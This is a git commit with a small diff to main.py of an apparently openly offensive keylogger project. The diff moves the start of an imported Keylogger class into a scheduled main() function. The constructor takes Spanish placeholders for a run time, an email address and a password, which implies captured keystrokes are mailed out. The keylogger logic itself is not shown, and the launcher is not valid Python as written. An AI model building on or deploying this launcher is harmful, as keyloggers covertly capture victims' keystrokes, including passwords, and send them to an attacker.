d9fd40c0a53919d3411ed57252a631c80214b4a1
ZXDe <43547674+ZXDe@users.noreply.github.com>
2020-07-30 17:53:47 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,10 @@
+from sched import scheduler
 import Keylogger
+def main():
+    my_keylogger = Keylogger.Keylogger(pon el tiempo que quieres que se ejcute,"pon aqui tu correo","pon aqui tu contraseña")
+    my_keylogger.start()
 
-my_keylogger = Keylogger.Keylogger(pon el tiempo que quieres que se ejcute,"pon aqui tu correo","pon aqui tu contraseña")
-my_keylogger.start()
+scheduler=scheduler()
+scheduler.enter(1,0,main)
 
+scheduler.run()
